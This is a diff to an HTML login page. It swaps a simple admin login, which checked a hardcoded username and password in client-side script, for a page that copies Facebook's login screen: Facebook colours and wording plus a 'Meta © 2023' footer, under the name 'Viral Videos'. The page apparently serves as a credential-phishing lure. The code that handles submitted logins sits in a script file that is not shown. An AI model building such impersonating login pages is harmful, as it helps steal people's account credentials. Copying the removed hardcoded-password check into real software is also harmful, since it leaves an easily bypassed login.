@@ -2,28 +2,33 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | Viral Videos</title>
   <link rel="stylesheet" href="style.css">
 </head>
-<body>
-  <div class="login-box">
-    <h2>Login</h2>
-    <div>
-      <input type="text" id="username" placeholder="Username" />
-      <input type="password" id="password" placeholder="Password" />
-      <button onclick="adminLogin()">Login</button>
+<body class="login-page">
+  <div class="login-container">
+    <svg class="logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="100" cy="100" r="90" stroke="#1877f2" stroke-width="4" fill="transparent"/>
+      <path d="M 70 100 Q 50 50 100 50 T 130 100 Q 150 150 100 150 T 70 100 Z" fill="#1877f2"/>
+      <path d="M 130 100 Q 150 50 100 50 T 70 100 Q 50 150 100 150 T 130 100 Z" fill="#1877f2"/>
+    </svg>
+    
+    <div class="login-form">
+      <h1>Log in to Viral Videos</h1>
+      <input type="text" placeholder="Email address or phone number" id="loginEmail">
+      <input type="password" placeholder="Password" id="loginPassword">
+      <button onclick="login()">Log In</button>
+      <a href="#" class="forgot-password">Forgotten password?</a>
+      <hr>
+      <button class="create-account" onclick="location.href='index.html'">Create New Account</button>
+    </div>
+    
+    <div class="meta-footer">
+      <p>Meta © 2023</p>
     </div>
   </div>
-  <script>
-    function adminLogin() {
-      const u = document.getElementById("username").value;
-      const p = document.getElementById("password").value;
-      if (u === "Minarul5454" && p === "Minarul5454") {
-        window.location.href = "admin.html";
-      } else {
-        alert("Invalid credentials");
-      }
-    }
-  </script>
+  
+  <script src="script.js"></script>
 </body>
 </html>
